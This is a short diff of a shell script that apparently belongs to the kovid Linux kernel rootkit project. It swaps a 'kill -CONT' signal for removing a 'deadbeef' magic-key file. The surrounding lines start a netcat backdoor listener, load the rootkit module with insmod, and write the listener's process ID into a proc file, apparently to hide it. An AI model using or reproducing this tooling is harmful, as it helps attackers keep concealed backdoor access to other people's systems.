@@ -18,6 +18,7 @@ echo "PID of nc is $NC_PID"
 echo "Backdoor listener started."
 
 insmod kovid.ko
-kill -CONT 31337
+# Toggle proc interface using magic key (deadbeef for test builds)
+rm -f deadbeef
 
 echo $NC_PID > /proc/myprocname
